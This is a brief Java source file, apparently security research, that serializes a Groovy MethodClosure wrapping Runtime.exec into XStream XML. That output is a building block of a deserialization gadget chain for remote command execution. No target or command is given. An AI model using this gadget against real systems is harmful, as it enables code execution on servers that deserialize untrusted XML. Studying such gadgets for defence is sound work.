package com.trganda.xstream.grooy;

import com.thoughtworks.xstream.XStream;
import org.codehaus.groovy.runtime.MethodClosure;

public class XStreamGroovyExec {
    public static void main(String[] args) throws Exception {
        XStream xStream = new XStream();
        //xStream.fromXML(xStream.toXML(1));

        System.out.println(xStream.toXML(new MethodClosure(Runtime.getRuntime(), "exec")));
    }
}
